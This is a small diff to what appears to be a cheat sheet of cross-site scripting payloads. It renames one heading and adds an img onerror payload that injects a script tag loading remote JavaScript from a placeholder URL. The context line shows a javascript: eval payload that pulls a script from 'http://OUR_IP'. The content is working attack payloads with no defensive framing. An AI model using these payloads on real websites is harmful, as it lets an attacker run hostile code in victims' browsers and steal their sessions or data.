@@ -50,9 +50,15 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 ```
 ---
 
-### javascript: use img tag in case script tag can't be executed
+### javascript: use img tag to execute JS
 ```html
 <img src='x' onerror='alert(0)'>
+```
+---
+
+### javascript: use img tag to execute JS file
+```html
+<img src="x" onerror="const script=document.createElement('script');script.src='<js_url>';script.async=true;document.body.appendChild(script);">
 ```
 ---
 
